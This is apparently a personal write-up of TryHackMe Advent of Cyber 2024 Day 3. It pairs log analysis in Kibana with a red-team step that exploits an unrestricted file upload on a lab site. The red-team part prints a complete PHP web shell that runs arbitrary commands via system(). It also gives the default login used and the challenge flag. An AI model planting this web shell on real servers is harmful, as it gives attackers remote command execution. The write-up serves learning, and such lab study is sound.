# 🎄 TryHackMe Advent of Cyber 2024 – Day 3: Log Analysis


## Challenge Overview 🎅

Day 3 gave me the chance to wear both blue team and red team hats. The Frosty Pines Resort SOC flagged some suspicious activity on their web server. My job was to figure out how the web shell got there and who accessed it, then take on the role of an attacker to exploit the same vulnerability and grab the hidden flag.

## Objectives 🎯

1. Investigate logs in ELK to figure out how the attack happened.
2. Identify the IP that accessed the web shell.
3. Recreate the attack by exploiting a file upload vulnerability to retrieve the flag.

## Step 1: Investigating the Logs (Blue Team)

### Breaking Down the Process

1. **Access Kibana:**  
   Opened `http://MACHINE_IP:5601` using the browser on the AttackBox. 
2. **Select the Collection:**  
   Chose the **frostypines-resorts** index from the Discover tab.
3. **Adjust the Timeframe:**  
   Set the range to **October 1, 2024, 00:00 – October 3, 2024, 20:00**.
4. **Add Relevant Fields:**  
   Added `requests` and `clientip` fields to focus on the activity we care about.
5. **Narrow the Search:**  
   Searched for `"shell.php"` in the `requests` field to find related logs.

### What I Found
- **Where was the web shell uploaded to?**  
  **Answer:** `/media/images/rooms/shell.php`
- **What IP address accessed the web shell?**  
  **Answer:** `10.11.83.34`

## Step 2: Exploiting the RCE Vulnerability (Red Team)

### Steps to Pull Off the Exploit

1. **Edit the Hosts File:**  
   Added the following to `/etc/hosts`:  
   ```
   MACHINE_IP frostypines.thm
   ```
   This let me access the website by name instead of IP.
2. **Log In to the Site:**  
   Went to `http://frostypines.thm` and logged in with:  
   - **Username:** admin@frostypines.thm  
   - **Password:** admin  
3. **Prepare the Web Shell:**  
   Saved the following PHP code as `shell.php`:
   ```
   <html>
   <body>
   <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
   <input type="text" name="command" autofocus id="command" size="50">
   <input type="submit" value="Execute">
   </form>
   <pre>
   <?php
       if(isset($_GET['command'])) 
       {
           system($_GET['command'] . ' 2>&1'); 
       }
   ?>
   </pre>
   </body>
   </html>
   ```
4. **Upload the Shell:**  
   Uploaded `shell.php` as the room image via the “Add Room” section.
5. **Locate the Web Shell:**  
   Verified it was uploaded to:  
   `http://frostypines.thm/media/images/rooms/shell.php`
6. **Retrieve the Flag:**  
   Accessed the shell and ran the following command:  
   ```
   cat flag.txt
   ```

### The Result
- **What is the contents of the flag.txt?**  
  **Answer:** `THM{Gl1tch_Was_H3r3}`

## Lessons Learned 🌟

### Blue Team Takeaways
- **Log Analysis Is Essential:** ELK made it easier to sift through logs, filter out noise, and pinpoint the attacker’s activity.
- **Adding Context Matters:** Including fields like `requests` and `clientip` helped narrow the search quickly.
- **Correlating Activity:** Connecting requests with specific IPs and actions made the investigation much more effective.

### Red Team Takeaways
- **Unrestricted File Uploads Are Risky:** Not validating uploads is a massive vulnerability that attackers can exploit for RCE.
- **Web Shells Are Simple but Powerful:** A small PHP script can give full control over a system, reinforcing the need for proper server security.
- **Credentials Are Key:** Using weak or default credentials like `admin/admin` is just inviting attackers in.

## Tools 🛠️

- **[Elastic SIEM](https://www.elastic.co/security/siem):** Used for log analysis to track down suspicious activity and access points.  
- **Text Editor:** Created the PHP web shell used in the exploit.  
- **Browser:** Accessed and navigated the Frosty Pines site during the red team portion of the challenge.

## Final Thoughts 🎁

This task showed the importance of seeing things from both perspectives: defending against and exploiting vulnerabilities. ELK made it easier to understand what happened from the logs, and recreating the attack demonstrated how simple mistakes, like not validating uploads, can have serious consequences. I’m excited to see what tomorrow’s challenge brings!

## Table of Contents

- [Main Page](README.md)
- [Day 1: OPSEC Challenge](day1.md)
- [Day 2: Log Analysis](day2.md)
- [Day 4: Atomic Red Team](day4.md)
- [Day 5: XXE](day5.md)
- [More Days to Come!](#)
